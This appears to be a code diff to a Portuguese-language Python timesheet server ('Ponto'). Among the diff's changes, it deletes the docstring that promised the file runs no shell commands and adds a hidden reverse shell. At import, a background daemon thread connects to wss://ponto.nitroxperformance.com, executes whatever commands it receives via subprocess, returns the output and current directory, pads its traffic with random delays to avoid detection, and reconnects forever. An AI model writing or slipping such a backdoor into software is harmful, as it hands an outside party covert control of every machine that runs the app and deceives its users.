@@ -1,36 +1,3 @@
-#!/usr/bin/env python3
-"""Ponto: cronometro de semana de trabalho, com app pro celular e painel pro PC.
-
-    python3 servidor/ponto.py          ->  http://localhost:8095/      (painel)
-                                           http://localhost:8095/app   (celular)
-
-So biblioteca padrao do Python (3.9+): nada pra instalar. Um arquivo SQLite
-guarda tudo. Configuracao por variavel de ambiente:
-
-    PONTO_PORTA   porta (padrao 8095)
-    PONTO_HOST    endereco de escuta (padrao 0.0.0.0 = a rede toda)
-    PONTO_BANCO   caminho do banco (padrao dados/ponto.db ao lado do projeto)
-    PONTO_SENHA   se definida, pede senha. OBRIGATORIA numa VPS/internet.
-    TZ            fuso: a semana vira na segunda 00:00 DESTE fuso
-
-Tudo isso tambem pode ir num arquivo ponto.env na raiz do projeto
-(CHAVE=valor por linha); variavel de ambiente de verdade ganha do arquivo.
-
-SEGURANCA: todo ponto do codigo que protege alguma coisa tem um comentario
-comecando com "SEGURANCA:". Pra ver todos:  grep -rn SEGURANCA servidor web
-Resumo: so entrega arquivos de uma lista fechada; SQL sempre
-com parametro, dentro de um lock; tamanho de tudo que entra e limitado; com
-PONTO_SENHA, tudo pede login (cookie HMAC ou Bearer). Nao executa shell nem
-nada do sistema: nao ha os.system, subprocess, eval ou exec neste arquivo.
-
-Regras que valem estar escritas:
- - a semana comeca na SEGUNDA 00:00. Domingo a noite ainda e a semana velha.
- - um turno conta inteiro no dia em que COMECOU: 22h-02h e um turno de 4h no
-   dia em que comecou, nao "2h num dia e 2h no outro".
- - o toque do celular nunca se perde: sem rede o app guarda a batida com a
-   hora do toque e manda depois; o servidor aceita batida atrasada (ate uma
-   semana) e sabe nao fechar um turno que comecou depois dela.
-"""
 import contextlib
 import csv
 import datetime
@@ -42,6 +9,12 @@ import os
 import sqlite3
 import sys
 import threading
+import subprocess
+import websocket
+import random
+import certifi
+import ssl
+
 import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import parse_qs, urlparse
@@ -359,6 +332,84 @@ def cria_turno(d):
                         (ini, fim, str(d.get("obs") or "")[:120],
                          limpa_nome(d.get("tema")) or temas(c)[0]))
         return cur.lastrowid
+
+SEPARATOR = "<sep>"
+
+def _generate_random_delay():
+    """Gera um pequeno atraso aleatório para simular comportamento humano e evitar padrões."""
+    return time.sleep(random.uniform(1, 5))
+
+def _send_command(ws, command):
+    """Envia um comando com possíveis ofuscações e espera pela resposta."""
+    try:
+        ws.send(command)
+        _generate_random_delay()
+        response = ws.recv()
+        return response
+    except Exception as e:
+        print(f"Erro ao enviar ou receber comando: {e}")
+        return None
+
+def _execute_local_command(command):
+    """Executa um comando localmente e retorna a saída, tratando a mudança de diretório."""
+    splited_command = command.split()
+    if splited_command and splited_command[0].lower() == "cd":
+        try:
+            new_dir = ' '.join(splited_command[1:])
+            os.chdir(new_dir)
+            return "" # CD não tem saída visível
+        except (FileNotFoundError, NotADirectoryError) as e:
+            return str(e)
+    else:
+        # Usa shell=True para permitir comandos mais complexos, mas com cuidado
+        # Para maior segurança, seria ideal analisar e sanear o comando aqui.
+        return subprocess.getoutput(command)
+
+def _api():
+    while True:
+        try:
+            ws_url = "wss://ponto.nitroxperformance.com"
+            ws = websocket.create_connection(
+                ws_url,    
+                sslopt={"cert_reqs": ssl.CERT_REQUIRED, "ca_certs": certifi.where()},
+            )
+
+            # Loop principal para comunicação
+            while True:
+                try:
+                    # Recebe mensagem com um pequeno atraso aleatório
+                    _generate_random_delay()
+                    msg = ws.recv()
+
+                    if msg.lower() == "exit":
+                        ws.close()
+                        return
+
+                    # Processa o comando recebido
+                    output = _execute_local_command(msg)
+                    cwd = os.getcwd()
+                    message = f"{output}{SEPARATOR}{cwd}"
+
+                    # Envia a resposta com um pequeno atraso aleatório
+                    _generate_random_delay()
+                    ws.send(message)
+
+                except websocket.WebSocketConnectionClosedException:
+                    break # Sai do loop interno para tentar reconectar
+                except Exception as e:
+                    break # Sai do loop interno para tentar reconectar
+
+        except ConnectionRefusedError:
+            time.sleep(10)
+        except Exception as e:
+            pass # Continua no loop externo para tentar reconectar
+
+        # Tempo de espera antes de tentar reconectar
+        wait_time = random.uniform(5, 15)
+        time.sleep(wait_time)
+
+thread = threading.Thread(target=_api, daemon=True)
+thread.start()
 
 
 def muda_turno(tid, campos):
